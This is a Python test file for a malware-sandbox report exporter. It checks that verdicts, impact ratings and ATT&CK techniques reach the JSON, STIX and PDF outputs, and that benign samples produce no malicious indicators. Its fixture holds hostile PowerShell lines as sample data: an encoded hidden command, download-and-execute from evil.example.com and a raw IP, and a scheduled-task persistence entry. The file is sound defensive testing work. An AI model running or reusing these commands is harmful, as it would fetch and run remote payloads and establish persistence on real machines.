"""The assessment must survive the export.

Two regressions are locked down here.

1. The verdict, the impact rating and the ATT&CK mapping are computed for every
   job and used to reach the verdict — but none of the three reached the JSON,
   the STIX bundle or the PDF, so an analyst's case file contained none of the
   product's actual findings.

2. Every extracted IOC was published as a STIX Indicator typed
   "malicious-activity" regardless of the verdict. Wired into a TIP that turns
   a benign sample's harmless links into blocklist entries.
"""
from __future__ import annotations

import base64
import re
import zlib

import stix2

from app.engine import pipeline
from app.engine import report as report_mod
from app.engine.models import JobStatus, SandboxJob
from app.engine.storage import store_bytes

_MALICIOUS = (
    b"powershell -w hidden -EncodedCommand aQBlAHgA\n"
    b"IEX ((New-Object Net.WebClient).DownloadString('http://evil.example.com/a.ps1'))\n"
    b"$c.DownloadFile('http://185.100.87.202/p.exe', 'C:\\Temp\\p.exe')\n"
    b"schtasks /create /tn Updater /tr C:\\Temp\\p.exe /sc onlogon\n"
)

#: A document whose only network references are the ordinary Microsoft links
#: any Office-adjacent file carries. This is the shape that used to be published
#: as malicious indicators.
_BENIGN = (
    b"Release notes\n"
    b"Product documentation: https://go.microsoft.com/fwlink/?linkid=2101234\n"
    b"Schema reference: http://schemas.microsoft.com/office/word/2010/wordml\n"
    b"Contact support@example.com with questions.\n"
)


def _run(db, payload: bytes, name: str) -> SandboxJob:
    job = pipeline.new_job(db, store_bytes(payload), original_name=name, tenant="default")
    db.commit()
    pipeline.run(db, job)
    db.commit()
    assert job.status == JobStatus.COMPLETED
    return job


def _pdf_text(pdf: bytes) -> str:
    """The visible text of a reportlab PDF.

    reportlab writes its page streams ASCII85-then-Flate encoded, so the drawn
    strings are nowhere in the raw bytes — asserting on `b"Impact" in pdf` would
    pass or fail for the wrong reason. Each stream is decoded and the operands
    of the text-showing operators are pulled out.
    """
    chunks: list[str] = []
    for raw in re.findall(rb"stream\r?\n(.*?)endstream", pdf, re.S):
        content = raw.strip(b"\r\n")
        try:
            content = zlib.decompress(base64.a85decode(content, adobe=True))
        except Exception:
            try:
                content = zlib.decompress(content)
            except zlib.error:
                pass
        chunks.extend(m.decode("latin-1") for m in re.findall(rb"\((.*?)\)\s*Tj", content, re.S))
    # reportlab escapes the PDF string delimiters; undo them so the assertions
    # compare against the text as it is rendered.
    return " ".join(chunks).replace("\\(", "(").replace("\\)", ")").replace("\\\\", "\\")


# ---------------------------------------------------------------------------
# FIX 1 — verdict / impact rating / ATT&CK reach every export
# ---------------------------------------------------------------------------


def test_json_export_carries_verdict_impact_and_mitre(db):
    job = _run(db, _MALICIOUS, "loader.ps1")
    report = report_mod.as_json(job)

    verdict = report["verdict"]
    assert verdict["verdict"] == job.verdict["verdict"]
    for key in ("verdict", "threat_name", "detection_ratio", "engines"):
        assert key in verdict, f"verdict export missing {key!r}"
    assert verdict["engines"], "the engine panel must survive the export"

    impact = report["impact"]
    for key in ("rating", "vector", "base_score", "severity", "metrics", "rationale"):
        assert key in impact, f"impact export missing {key!r}"
    assert impact["vector"].startswith("CIR:1.0/")
    # An export read outside our UI has to say what the number is, so the
    # disclaimer travels on the row rather than being rendered per surface.
    assert "not CVSS" in impact["disclaimer"]

    assert report["mitre"] == job.mitre
    assert report["mitre"], "the sample maps to ATT&CK techniques; the export dropped them"


def test_stix_export_emits_attack_patterns_linked_to_the_malware(db):
    job = _run(db, _MALICIOUS, "loader.ps1")
    assert job.verdict["verdict"] == "malicious"
    bundle = report_mod.as_stix(job)

    # Still a bundle the spec accepts, not just a dict that looks like one.
    stix2.parse(bundle, allow_custom=False)

    by_type: dict[str, list[dict]] = {}
    for obj in bundle["objects"]:
        by_type.setdefault(obj["type"], []).append(obj)

    patterns = by_type.get("attack-pattern", [])
    assert patterns, "the ATT&CK mapping produced no attack-pattern objects"
    exported_ids = set()
    for pattern in patterns:
        refs = [r for r in pattern["external_references"] if r["source_name"] == "mitre-attack"]
        assert len(refs) == 1, "an attack-pattern must carry exactly one mitre-attack reference"
        tid = refs[0]["external_id"]
        exported_ids.add(tid)
        assert re.fullmatch(r"T\d{4}(\.\d{3})?", tid), tid
        # Sub-techniques live under their parent in the URL, not as a dotted id.
        parent, _, sub = tid.partition(".")
        expected = f"https://attack.mitre.org/techniques/{parent}/{sub}/" if sub \
            else f"https://attack.mitre.org/techniques/{parent}/"
        assert refs[0]["url"] == expected
    assert exported_ids == {t["technique_id"] for t in job.mitre}
    assert any("." in tid for tid in exported_ids), "expected a sub-technique in this sample"

    malware = by_type["malware"][0]
    assert malware["name"] == job.verdict["threat_name"]

    used = {
        r["target_ref"]
        for r in by_type.get("relationship", [])
        if r["relationship_type"] == "uses" and r["source_ref"] == malware["id"]
    }
    assert used == {p["id"] for p in patterns}, "attack-patterns must relate to the malware"


def test_pdf_export_shows_the_verdict_impact_and_attack_techniques(db):
    job = _run(db, _MALICIOUS, "loader.ps1")
    text = _pdf_text(report_mod.as_pdf(job))

    assert "Cyclowareness Impact Rating" in text
    assert "not CVSS" in text, "the PDF must say what the number is not"
    assert job.impact["vector"] in text
    assert f"{job.impact['base_score']:.1f}" in text
    assert job.impact["severity"].upper() in text

    assert job.verdict["verdict"].upper() in text
    assert job.verdict["threat_name"] in text
    assert job.verdict["detection_ratio"] in text

    for technique in job.mitre:
        assert technique["technique_id"] in text
        assert technique["tactic"] in text


# ---------------------------------------------------------------------------
# FIX 2 — a sample we did not call malicious never accuses its own IOCs
# ---------------------------------------------------------------------------


def test_benign_sample_publishes_no_malicious_indicators(db):
    job = _run(db, _BENIGN, "release-notes.txt")
    assert job.verdict["verdict"] != "malicious", job.verdict
    assert job.iocs.get("domains") or job.iocs.get("urls"), "fixture must carry IOCs to gate"

    bundle = report_mod.as_stix(job)
    stix2.parse(bundle, allow_custom=False)

    types = [obj["type"] for obj in bundle["objects"]]
    assert "indicator" not in types, "a sample we did not call malicious accused its own IOCs"
    assert "malware" not in types, "a sample we did not call malicious was named as malware"

    serialized = str(bundle)
    assert "malicious-activity" not in serialized
    assert "go.microsoft.com" in serialized, "the facts should still be exported"

    # The IOCs ship as observed-data instead: what the file contained, no claim.
    observed = [obj for obj in bundle["objects"] if obj["type"] == "observed-data"]
    assert len(observed) == 1
    scos = {obj["id"] for obj in bundle["objects"] if obj["type"] in ("url", "domain-name", "ipv4-addr", "email-addr")}
    assert scos and set(observed[0]["object_refs"]) <= scos | {
        obj["id"] for obj in bundle["objects"] if obj["type"] == "file"
    }
